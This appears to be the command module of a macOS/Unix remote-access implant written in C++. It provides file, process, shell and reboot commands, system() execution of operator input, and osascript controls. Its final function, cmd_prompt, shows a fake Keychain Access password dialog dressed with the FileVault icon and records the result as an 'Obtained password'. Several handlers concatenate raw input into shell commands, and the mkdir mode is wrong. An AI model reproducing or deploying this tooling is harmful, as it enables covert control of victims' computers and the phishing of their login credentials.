#include "commands.hpp"
#include "utils.hpp"

void cmd_rm(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        if (std::remove(commands[1].c_str()) < 0)
            console_log_error("No such file!");
    } else
        console_log("Usage: rm <file>");
}

void cmd_rmdir(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        if (rmdir(commands[1].c_str()) < 0)
            console_log_error("No such directory!");
    } else
        console_log("Usage: rmdir <directory>");
}

void cmd_mkdir(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        if (mkdir(commands[1].c_str(), 777) < 0)
            console_log_error("Directory already exists!");
    } else
        console_log("Usage: mkdir <directory>");
}

void cmd_exec(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        system(commands[1].c_str());
    else
        console_log("Usage: exec <commands>");
}

void cmd_cd(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        chdir(commands[1].c_str());
    else
        console_log("Usage: cd <directory>");
}

void cmd_touch(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        std::fstream file;
        file.open(commands[1].c_str(), std::ios::out);
        file.close();
    } else
        console_log("Usage: touch <file>");
}

void cmd_chmod(std::vector<std::string> commands)
{
    if (commands.size() > 2)
        chmod(commands[2].c_str(), std::stoi(commands[1]));
    else
        console_log("Usage: chmod <mode> <path>");
}

void cmd_chroot(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        chroot(commands[1].c_str());
    else
        console_log("Usage: chroot <path>");
}

void cmd_ls(std::vector<std::string> commands)
{
    struct dirent *entry;

    if (commands.size() > 1) {
        DIR *dir = opendir(commands[1].c_str());
        if (dir == NULL) {
            console_log_error("No such directory.");
        }

        while ((entry = readdir(dir)) != NULL)
            console_log(std::string(entry->d_name));

        closedir(dir);
        return;
    }

    char directory[1024];
    getcwd(directory, sizeof(directory));
    DIR *dir = opendir(directory);

    if (dir == NULL) {
        console_log_error("No such directory.");
    }

    while ((entry = readdir(dir)) != NULL)
        console_log(std::string(entry->d_name));

    closedir(dir);
}

void cmd_kill(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        kill(std::stoi(commands[1]), SIGTERM);
    else
        console_log("Usage: kill <process_id>");
}

void cmd_cat(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        std::ifstream input(commands[1]);
        for (std::string line; getline(input, line); )
            console_log(line);
    } else
        console_log("Usage: cat <file>");
}

void cmd_shell()
{
    system("/bin/sh");
}

void cmd_pwd()
{
    char directory[1024];
    getcwd(directory, sizeof(directory));
    console_log(std::string(directory));
}

void cmd_whoami()
{
    std::string username = std::string(getlogin());
    console_log(username);
}

void cmd_hostname()
{
    char hostname[1024];
    gethostname(hostname, sizeof(hostname));
    console_log(std::string(hostname));
}

void cmd_getuid()
{
    std::string uid = std::to_string(getuid());
    console_log_information("Current user id: ", 0);
    console_log(uid);
}

void cmd_getpid()
{
    std::string pid = std::to_string(getpid());
    console_log_information("Membrane attached PID: ", 0);
    console_log(pid);
}

void cmd_getgid()
{
    std::string gid = std::to_string(getgid());
    console_log_information("Current group id: ", 0);
    console_log(gid);
}

void cmd_ps()
{
    system("ps aux");
}

void cmd_reboot()
{
    sync();
    reboot(RB_AUTOBOOT);
}

void cmd_help()
{
    int counter = 0;

    for (const auto& [key, _] : passCmds) {
        if (counter % 5 == 0) {
            console_log("");
            console_log("  ", 0);
        }
        console_log(key + ", ", 0);
        counter++;
    }

    for (const auto& [key, _] : nopassCmds) {
        if (counter % 5 == 0) {
            console_log("");
            console_log("  ", 0);
        }
        console_log(key + ", ", 0);
        counter++;
    }

    if (counter % 5 != 0)
        console_log(" exit");
    else {
        console_log("");
        console_log("  exit");
    }
    console_log("");
}

void cmd_osascript(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        system(("osascript -e '" + commands[1] + "'").c_str());
    else
        console_log("Usage: osascript <script>");
}

void cmd_setvol(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        system(("osascript -e 'set volume output volume " + commands[1] + "'").c_str());
    else
        console_log("Usage: setvol <percentage>");
}

void cmd_say(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        system(("say " + commands[1]).c_str());
    else
        console_log("Usage: say <message>");
}

void cmd_getvol()
{
    console_log_information("Current volume level: ");
    sleep(0.3);
    system("osascript -e 'output volume of (get volume settings)'");
}

void cmd_prompt()
{
    std::string payload = "set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer";

    console_log_information("Obtained password: ");
    sleep(0.3);
    system(("osascript -e '" + payload + "'").c_str());
}
